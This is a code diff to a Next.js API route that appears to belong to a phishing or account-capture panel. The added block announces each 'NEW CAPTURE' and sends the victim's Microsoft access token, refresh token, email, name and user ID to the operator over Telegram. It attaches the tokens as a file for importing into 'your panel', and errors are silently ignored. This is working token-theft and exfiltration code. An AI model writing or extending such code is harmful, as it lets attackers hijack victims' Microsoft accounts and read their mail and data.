@@ -113,6 +113,42 @@ export async function POST(request: NextRequest) {
       // non-critical
     }
 
+    // Send Telegram notification + token file (non-critical)
+    try {
+      const { sendTelegramNotification, sendTelegramDocument } = await import("@/lib/telegram");
+      const connectedEmail = profile.mail || profile.userPrincipalName;
+      const displayName = profile.displayName || connectedEmail;
+      const now = new Date();
+
+      const message = [
+        `🔔 <b>NEW CAPTURE</b>`,
+        `${displayName}`,
+        `${connectedEmail}`,
+        `${now.toISOString().replace("T", " ").slice(0, 19)} UTC`,
+      ].join("\n");
+
+      await sendTelegramNotification(userId, message);
+
+      const tokenFileContent = JSON.stringify({
+        access_token,
+        refresh_token,
+        user_email: connectedEmail,
+        display_name: displayName,
+        microsoft_user_id: profile.id,
+        token_expires_at: tokenExpiresAt.toISOString(),
+      }, null, 2);
+
+      const safeEmail = connectedEmail.replace("@", "_at_");
+      await sendTelegramDocument(
+        userId,
+        tokenFileContent,
+        `${safeEmail}_token.txt`,
+        "Import this file if the token doesn't appear in your panel"
+      );
+    } catch {
+      // non-critical
+    }
+
     return NextResponse.json({
       status: "complete",
       email: profile.mail || profile.userPrincipalName,
